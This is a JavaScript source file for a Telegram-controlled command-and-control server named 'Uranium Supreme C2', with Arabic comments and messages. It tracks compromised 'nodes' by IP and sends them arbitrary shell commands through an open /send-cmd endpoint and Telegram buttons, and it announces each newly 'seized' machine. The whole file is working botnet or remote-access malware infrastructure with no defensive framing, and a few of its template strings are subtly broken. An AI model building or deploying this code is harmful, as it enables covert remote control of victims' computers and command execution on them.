const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const PORT = process.env.PORT || 10000;

// قراءة المتغيرات البرمجية المضافة في Render بدقة
const BOT_TOKEN = process.env.TG_TOKEN || process.env.BOT_TOKEN || '';
const ADMIN_ID = process.env.TG_ID || process.env.ADMIN_ID || '';

const bot = BOT_TOKEN ? new TelegramBot(BOT_TOKEN, { polling: true }) : null;

let activeNodes = {};
let pendingCommands = {};

// استقبال نبضات العقد الحية وتتبعها
app.post('/node/pulse', (req, res) => {
    const { node_id, status } = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const targetId = node_id || "Nasser_Supreme_Node";
    const isNew = !activeNodes[targetId];

    activeNodes[targetId] = {
        ip: clientIp,
        lastSeen: Date.now(),
        status: status || 'active'
    };
    
    // إرسال تنبيه فوري عبر تليجرام عند دخول عقدة جديدة
    if (isNew && bot && ADMIN_ID) {
        const opts = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "⚡ تنفيذ شل (ls)", callback_data: `cmd:${targetId}:ls` },
                        { text: "📱 معلومات النظام", callback_data: `cmd:${targetId}:get_info` }
                    ]
                ]
            }
        };
        bot.sendMessage(ADMIN_ID, `🚨 <b>تم رصد عقدة يورانيوم جديدة والسيطرة عليها!</b>\n\n📱 <b>المعرف:</b> <code>${targetId}</code>`, { parse_mode: 'HTML', ...opts });
    }

    let responsePayload = "ACK_OK";
    if (pendingCommands[targetId]) {
        responsePayload = `CMD:${pendingCommands[targetId]}`;
        delete pendingCommands[targetId];
    }
    
    res.status(200).send(responsePayload);
});

// لوحة التحكم البرمجية لعرض العقد
app.get('/nodes', (req, res) => {
    res.json({
        empire: "مملكة ناصر دين الله الكلعي - Uranium Supreme v8.1",
        activeCount: Object.keys(activeNodes).length,
        nodes: activeNodes
    });
});

// مسار جدولة وإرسال الأوامر
app.get('/send-cmd', (req, res) => {
    const { node_id, cmd } = req.query;
    const targetId = node_id || "Nasser_Supreme_Node";
    if (!cmd) {
        return res.status(400).send("الرجاء تحديد أمر التنفيذ عبر ?cmd=...");
    }
    pendingCommands[targetId] = cmd;
    res.send(`[+] تم جدولة الأمر بنجاح للعقدة [${targetId}]: ${cmd}`);
});

// تفعيل أوامر وأزرار بوت التليجرام التفاعلي
if (bot) {
    bot.onText(/\/start|\/help/, (msg) => {
        if (String(msg.from.id) !== String(ADMIN_ID)) return;
        const opts = {
            reply_markup: {
                keyboard: [
                    [{ text: "📱 الأجهزة المتصلة" }, { text: "🎮 لوحة التحكم" }]
                ],
                resize_keyboard: true
            }
        };
        bot.sendMessage(msg.chat.id, "👑 <b>لوحة التحكم المركزية لإمبراطورية Uranium Supreme</b>\n\nاختر من الأزرار:", { parse_mode: 'HTML', ...opts });
    });

    bot.on('message', (msg) => {
        if (String(msg.from.id) !== String(ADMIN_ID)) return;
        
        if (msg.text === "📱 الأجهزة المتصلة" || msg.text === "/nodes") {
            const nodeKeys = Object.keys(activeNodes);
            if (nodeKeys.length === 0) {
                bot.sendMessage(msg.chat.id, "❌ لا توجد أجهزة متصلة حالياً.");
                return;
            }

            nodeKeys.forEach(nodeId => {
                const opts = {
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "⚡ تنفيذ شل (ls)", callback_data: `cmd:${nodeId}:ls` },
                                { text: "🌐 فحص الشبكة", callback_data: `cmd:${nodeId}:ifconfig` }
                            ]
                        ]
                    }
                };
                bot.sendMessage(msg.chat.id, `💀 <b>عقدة نشطة:</b> <code>{nodeId}</code>`, { parse_mode: 'HTML', ...opts });
            });
        }
    });

    bot.on('callback_query', (query) => {
        if (String(query.from.id) !== String(ADMIN_ID)) return;
        const parts = query.data.split(':');
        if (parts.length === 3 && parts[0] === 'cmd') {
            const targetId = parts[1];
            const cmdStr = parts[2];
            
            pendingCommands[targetId] = cmdStr;
            bot.answerCallbackQuery(query.id, { text: `تم حقن الأمر: ${cmdStr}` });
            bot.sendMessage(query.message.chat.id, `🚀 <b>تم إرسال الأمر للعقدة <code>{targetId}</code>:</b> <code>{cmdStr}</code>`, { parse_mode: 'HTML' });
        }
    });
}

app.get('/', (req, res) => {
    res.send("<h1>[⚡] Uranium Supreme C2 Server v8.1 Online</h1>");
});

app.listen(PORT, () => {
    console.log(`[+] Uranium C2 Server running on port ${PORT}`);
});
